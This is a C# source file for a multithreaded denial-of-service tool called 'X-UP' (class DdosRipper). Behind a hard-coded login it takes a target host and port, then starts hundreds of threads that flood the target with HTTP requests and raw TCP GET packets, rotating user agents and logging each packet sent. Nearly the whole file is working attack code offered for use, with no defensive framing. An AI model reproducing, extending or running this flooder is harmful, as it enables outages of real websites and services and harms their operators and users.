using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Collections;
using SharpRGB;
using System.Security.Cryptography.X509Certificates;

class DdosRipper
{
    class CustomConsole
    {
        public static void Write(string text)
        {
            foreach (char c in text)
            {
                if (c == '+')
                    Console.ForegroundColor = (ConsoleColor)1; // Red color for '+'
                else if (c == '!')
                    Console.ForegroundColor = (ConsoleColor)2; // Green color for '!'

                else if (c == '?')
                    Console.ForegroundColor = (ConsoleColor)4; // Blue color for '?'

                else if (c == '♦')
                    Console.ForegroundColor = (ConsoleColor)3; // Blue color for '?'

                else if (c == '♠')
                    Console.ForegroundColor = (ConsoleColor)8; // Blue color for '?'
                else
                    Console.ResetColor(); // Reset color for all other characters

                Console.Write(c);
            }

            Console.ResetColor(); // Reset color after printing all characters
        }
        public static void WriteLine(string text)
        {
            Write(text);
            Console.WriteLine();
        }
    }

    private static string correctUsername = "bitch";
    private static string correctPassword = "1234!";
    private static string host;
    private static int port = 80;
    private static int turbo = 999;

    private static Queue itemQueue = new Queue();
    private static string data;
    private static string[] userAgents =
    {
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        // 추가 User-Agent를 여기에 삽입
    };
    private static string[] bots =
    {
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        // 추가 봇 URL 삽입
    };
    static void Logo()
    {
        Console.ForegroundColor = (ConsoleColor)1;
        RGBConsole.SetConsoleColor(1, 33, 100, 243);
        Console.WriteLine(@"                                               
`8.`8888.      ,8' 8 8888      88 8 888888888o   
 `8.`8888.    ,8'  8 8888      88 8 8888    `88. 
  `8.`8888.  ,8'   8 8888      88 8 8888     `88 
   `8.`8888.,8'    8 8888      88 8 8888     ,88 
    `8.`88888'     8 8888      88 8 8888.   ,88' 
    .88.`8888.     8 8888      88 8 888888888P'  
   .8'`8.`8888.    8 8888      88 8 8888         
  .8'  `8.`8888.   ` 8888     ,8P 8 8888         
 .8'    `8.`8888.    8888   ,d8P  8 8888         
.8'      `8.`8888.    `Y88888P'   8 8888
                                By @unzi2018
");
    Console.ResetColor();
    
    
    }
    static void Main(string[] args)
    {
        RGBConsole.SetConsoleColor(1, 204, 0, 204);
        Console.Title = "X-UP";

        CustomConsole.WriteLine("[+] Welcome X-UP");
        Logo();
        Console.WriteLine("Enter Username: ");
        string username = Console.ReadLine();
        if (username == correctUsername)
        {
            Console.Write("Enter Password: ");
            string password = ReadPassword();
            if (password == correctPassword)
            {
                Console.WriteLine(); // 새로운 줄로 넘어가기
                RGBConsole.SetConsoleColor(2, 20, 65, 34);
                CustomConsole.WriteLine("[+] Logged in successfully " + username);
                GetParameters();
                LoadHeaders();
                StartBotThreads();
            }
            else
            {
                Console.WriteLine("Password incorrect!");
            }
        }
        else
        {
            Console.WriteLine("Username incorrect!");
        }
    }

    private static string ReadPassword()
    {
        StringBuilder password = new StringBuilder();
        ConsoleKeyInfo key;
        while (true)
        {
            key = Console.ReadKey(true);
            if (key.Key == ConsoleKey.Enter)
                break;
            if (key.Key == ConsoleKey.Backspace && password.Length > 0)
            {
                password.Length--; // Remove last character
                Console.Write("\b \b");
            }
            else
            {
                password.Append(key.KeyChar);
                Console.Write("*");
            }
        }
        return password.ToString();
    }

    private static void GetParameters()
    {
        // Host, port, turbo 설정
        Console.Write("Enter Host IP: ");
        host = Console.ReadLine();
        Console.Write("Enter Port (default 80): ");
        string portInput = Console.ReadLine();
        if (!string.IsNullOrEmpty(portInput))
        {
            port = int.Parse(portInput);
        }
        Console.Write("Enter Turbo (default 999): ");
        string turboInput = Console.ReadLine();
        if (!string.IsNullOrEmpty(turboInput))
        {
            turbo = int.Parse(turboInput);
        }
  

        // Print the log message with randomized color
        Console.WriteLine($"Attacking {host} on port {port} with turbo {turbo}");

  

    }
  

    private static void LoadHeaders()
    {
        try
        {
            data = File.ReadAllText("headers.txt");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error reading headers.txt: " + ex.Message);
            Environment.Exit(1);
        }
    }

    private static void StartBotThreads()
    {
        // 멀티스레딩을 통해 봇 리핑 작업을 분리하여 실행
        for (int i = 0; i < turbo; i++)
        {
            Thread botThread = new Thread(BotRipper);
            botThread.IsBackground = true;
            botThread.Start();
        }

        // dos 공격
        for (int i = 0; i < turbo; i++)
        {
            Thread dosThread = new Thread(DosAttack);
            dosThread.IsBackground = true;
            dosThread.Start();
        }

        Console.WriteLine("Attack started...");
        while (true)
        {
            Thread.Sleep(100);
        }
    }
   
    private static void BotRipper()
    {
        try
        {
            while (true)
            {
                string url = "http://" + host;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.UserAgent = userAgents[new Random().Next(userAgents.Length)];
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        

                // Print the log message with randomized color
                Console.WriteLine("[?] Bot is ripping...");

                // Reset the console color to default
             
                response.Close();
                Thread.Sleep(100);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error in bot rippering: " + ex.Message);
            // 예외 발생 시 프로그램 종료되지 않도록 예외를 기록만하고 계속 진행
            
        }
    }


    private static void DosAttack()
    {
        try
        {
            while (true)
            {
                // 소켓을 통해 패킷 전송
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(host, port);
                string request = "GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + userAgents[new Random().Next(userAgents.Length)] + "\r\n" + data;
                byte[] packet = Encoding.UTF8.GetBytes(request);
                socket.Send(packet);
                socket.Shutdown(SocketShutdown.Send);
                socket.Close();
                Console.WriteLine($" Packet sent to {host}:{port}");
                Thread.Sleep(100);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error in DOS attack: " + ex.Message);
        }
    }
}
